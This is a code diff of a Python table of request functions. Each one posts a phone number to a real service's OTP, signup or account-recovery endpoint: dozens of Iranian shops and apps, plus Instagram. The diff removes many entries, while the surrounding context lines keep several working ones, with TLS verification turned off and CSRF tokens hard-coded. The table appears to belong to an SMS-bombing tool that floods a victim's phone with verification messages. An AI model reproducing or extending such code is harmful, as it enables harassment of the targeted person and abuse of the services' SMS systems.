@@ -190,18 +190,6 @@ SERVICES = {
         verify=False
     ),
     
-    'wideapp': lambda num: post(
-        url="https://agent.wide-app.ir/auth/token",
-        json={
-            "grant_type": "otp",
-            "client_id": "62b30c4af53e3b0cf100a4a0",
-            "phone": num
-        },
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
     'emtiyaz': lambda num: post(
         url="https://web.emtiyaz.app/json/login",
         data=f"send=1&cellphone={num}",
@@ -220,15 +208,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'classino': lambda num: post(
-        url="https://nx.classino.com/otp/v1/api/login",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+
     'bama': lambda num: post(
         url="https://bama.ir/signin-checkforcellnumber",
         data=f"cellNumber={num}",
@@ -279,15 +259,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'pinket': lambda num: post(
-        url="https://pinket.com/api/cu/v2/phone-verification",
-        json={"phoneNumber": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+      
     'shab': lambda num: post(
         url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
         json={"mobile": num},
@@ -299,33 +271,6 @@ SERVICES = {
     'itoll': lambda num: post(
         url="https://app.itoll.ir/api/v1/auth/login",
         json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'raybit': lambda num: post(
-        url="https://api.raybit.net:3111/api/v1/authentication/register/mobile",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'pubisha': lambda num: post(
-        url="https://www.pubisha.com/login/checkCustomerActivation",
-        data=f"mobile={num}",
-        headers={
-            **kon,
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        timeout=5,
-        verify=False
-    ),
-    
-    'farvi': lambda num: post(
-        url="https://farvi.shop/api/v1/sessions/login_request",
-        json={"mobile_phone": num},
         headers=kon,
         timeout=5,
         verify=False
@@ -411,14 +356,6 @@ SERVICES = {
         verify=False
     ),
     
-    'hyperjan': lambda num: post(
-        url="https://shop.hyperjan.ir/api/users/manage",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
     'hiword': lambda num: post(
         url="https://hiword.ir/wp-json/otp-login/v1/login",
         json={"identifier": num},
@@ -434,15 +371,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'dicardo': lambda num: post(
-        url="https://dicardo.com/main/sendsms",
-        json={"phone": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+     
     'ghasedak24': lambda num: post(
         url="https://ghasedak24.com/user/ajax_register",
         json={"username": num},
@@ -462,14 +391,6 @@ SERVICES = {
     'digistyle': lambda num: post(
         url="https://www.digistyle.com/users/login-register/",
         json={"loginRegister[email_phone]": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'banankala': lambda num: post(
-        url="https://banankala.com/home/login",
-        json={"Mobile": num},
         headers=kon,
         timeout=5,
         verify=False
@@ -557,23 +478,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'rokla': lambda num: post(
-        url="https://api.rokla.ir/api/request/otp",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'khodro45': lambda num: post(
-        url="https://khodro45.com/api/v1/customers/otp/",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+  
     'mashinbank': lambda num: post(
         url="https://mashinbank.com/api2/users/check",
         json={"mobileNumber": num},
@@ -629,15 +534,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'tj8': lambda num: post(
-        url="https://tj8.ir/auth/register",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+      
     'cinematicket': lambda num: post(
         url="https://cinematicket.org/api/v1/users/signup",
         json={"phone_number": num},
@@ -693,23 +590,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'tamland': lambda num: post(
-        url="https://1401api.tamland.ir/api/user/signup",
-        json={"Mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'opco': lambda num: post(
-        url="https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code",
-        json={"telephone": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+
     'digikalajet': lambda num: post(
         url="https://api.digikalajet.ir/user/login-register/",
         json={"phone": num},
@@ -725,15 +606,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'safiran': lambda num: post(
-        url="https://safiran.shop/login",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+
     'delino_restaurant': lambda num: post(
         url="https://restaurant.delino.com/user/register",
         json={
@@ -746,25 +619,9 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'tandori': lambda num: post(
-        url="https://garcon.tandori.ir/users/v1/main/login",
-        json={"phone": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+     
     'dastkhat': lambda num: post(
         url="https://dastkhat-isad.ir/api/v1/user/store",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'irwco': lambda num: post(
-        url="https://irwco.ir/register",
         json={"mobile": num},
         headers=kon,
         timeout=5,
@@ -790,22 +647,6 @@ SERVICES = {
     'arshiyan': lambda num: post(
         url="https://api.arshiyan.com/send_code",
         json={"country_code": "98", "phone_number": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'topnoor': lambda num: post(
-        url="https://backend.topnoor.ir/web/v1/user/otp",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'alinance': lambda num: post(
-        url="https://api.alinance.com/user/register/mobile/send/",
-        json={"phone_number": num},
         headers=kon,
         timeout=5,
         verify=False
@@ -890,15 +731,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'paymishe': lambda num: post(
-        url="https://api.paymishe.com/api/v1/otp/registerOrLogin",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+  
     'rayshomar': lambda num: post(
         url="https://api.rayshomar.ir/api/Register/RegistrMobile",
         json={"MobileNumber": num},
@@ -927,25 +760,6 @@ SERVICES = {
         url="https://mamifood.org/Registration.aspx/SendValidationCode",
         json={"Phone": num},
         headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'uphone': lambda num: post(
-        url="https://server.uphone.ir/api/v1/login/otp/request",
-        json={"mobile": num},
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
-    'glite': lambda num: post(
-        url="https://www.glite.ir/wp-admin/admin-ajax.php",
-        data=f"action=logini_first&login={num}",
-        headers={
-            **kon,
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
         timeout=5,
         verify=False
     ),
@@ -1141,21 +955,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'olgoobooks': lambda num: post(
-        url="https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox",
-        json={
-            "contactInfo[mobile]": num,
-            "contactInfo[agreementAccepted]": "1",
-            "contactInfo[teachingFieldId]": "1",
-            "contactInfo[eduGradeIds][7]": "7",
-            "submit_register": "1"
-        },
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+
     'pakhsh': lambda num: post(
         url="https://www.pakhsh.shop/wp-admin/admin-ajax.php",
         data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0",
@@ -1216,17 +1016,6 @@ SERVICES = {
     'ifollow': lambda num: post(
         url="https://i.devslop.app/app/ifollow/api/otp.php/",
         data=f"number={num}&state=number&",
-        headers={
-            **kon,
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        timeout=5,
-        verify=False
-    ),
-    
-    'behzadshami': lambda num: post(
-        url="https://behzadshami.com/wp-admin/admin-ajax.php",
-        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=3b4194a8bb&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_%D9%81%DB%8C%D9%84%D8%AF%D9%85%D8%AA%D9%86%DB%8C1642498931181=Nvgu&digregcode=%2B98&digits_reg_mail={num}&dig_otp=&code=&dig_reg_mail=&dig_nounce=3b4194a8bb",
         headers={
             **kon,
             "Content-Type": "application/x-www-form-urlencoded"
@@ -1312,31 +1101,6 @@ SERVICES = {
         verify=False
     ),
     
-    'kardoon': lambda num: post(
-        url="https://app.kardoon.ir:4433/api/users",
-        json={
-            "optype": 15,
-            "userid": 0,
-            "mobile": num,
-            "firstname": "",
-            "lastname": "",
-            "cityid": 0,
-            "email": "",
-            "birthdate": "",
-            "gender": "False",
-            "avatarid": 0,
-            "packagename": "",
-            "versioncode": -1,
-            "tokenkey": "",
-            "username": "",
-            "password": "",
-            "connectionname": "MainConStr"
-        },
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
     'amoomilad': lambda num: post(
         url="https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",
         json={
@@ -1360,18 +1124,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'bandarazad': lambda num: post(
-        url="https://bandarazad.com/wp-admin/admin-ajax.php",
-        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail={num}&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a",
-        headers={
-            **kon,
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        timeout=5,
-        verify=False
-    ),
-    
+ 
     'bazidone': lambda num: post(
         url="https://bazidone.com/wp-admin/admin-ajax.php",
         data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={num}&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2",
@@ -1411,29 +1164,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'instagram': lambda num: post(
-        url="https://www.instagram.com/accounts/account_recovery_send_ajax/",
-        data=f"email_or_username=%2B{num}&recaptcha_challenge_field=&flow=&app_id=&source_account_id=",
-        headers={
-            **kon,
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        timeout=5,
-        verify=False
-    ),
-    
-    'hemat': lambda num: post(
-        url="https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",
-        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail={num}&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828",
-        headers={
-            **kon,
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        timeout=5,
-        verify=False
-    ),
-    
+      
     'mipersia': lambda num: post(
         url="https://www.mipersia.com/wp-admin/admin-ajax.php",
         data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail={num}&digregscode2=%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72",
@@ -1444,18 +1175,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'kodakamoz': lambda num: post(
-        url="https://www.kodakamoz.com/wp-admin/admin-ajax.php",
-        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail={num}&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc",
-        headers={
-            **kon,
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        timeout=5,
-        verify=False
-    ),
-    
+
     'tajtehran': lambda num: post(
         url="https://tajtehran.com/RegisterRequest",
         data=f"mobile={num}&password=mamad1234",
@@ -1477,20 +1197,7 @@ SERVICES = {
         timeout=5,
         verify=False
     ),
-    
-    'okala': lambda num: post(
-        url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",
-        json={
-            "mobile": num,
-            "deviceTypeCode": 0,
-            "confirmTerms": True,
-            "notRobot": False
-        },
-        headers=kon,
-        timeout=5,
-        verify=False
-    ),
-    
+ 
     'paklean_voice': lambda num: post(
         url="https://client.api.paklean.com/user/resendVoiceCode",
         json={"username": num},
